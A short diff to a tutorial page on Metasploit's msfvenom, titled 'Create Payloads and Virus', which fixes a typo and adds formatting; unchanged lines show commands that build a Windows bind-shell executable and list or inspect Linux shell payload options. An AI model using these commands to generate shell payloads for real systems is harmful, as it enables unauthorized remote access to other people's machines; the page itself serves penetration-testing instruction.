@@ -1,6 +1,6 @@
 <img src="https://github.com/dewebdes/CYBER-MILITARY-GERMANY/blob/master/Metasploit/msfvenom/msfvenom.jpg" />
 <h1>Create Payloads and Virus</h1>
-<h2>MSFVenom is new and cobine msfpayload, encrypts & others together</h2>
+<h2>MSFVenom is new and combine msfpayload, encrypts & others together</h2>
 <h3>Sample usage</h3>
 <code>msfvenom -p windows/shell_bind_tcp LPORT=1337 LHOST=<IP> -f exe -o bindshell.exe</code>
 <p>
@@ -11,7 +11,7 @@ msfvenom -l [payloads,encoders,nops,platforms,archs,encrypt,formats,all]
 </p>
 <p>
 <code>msfvenom -p linux/x86/shell_bind_ipv6_tcp --list-options</code>
-show target payload options
+	<br><b>show target payload options</b>
 </p>
 <p>
 	<code>msfvenom -f [format-name]</code>
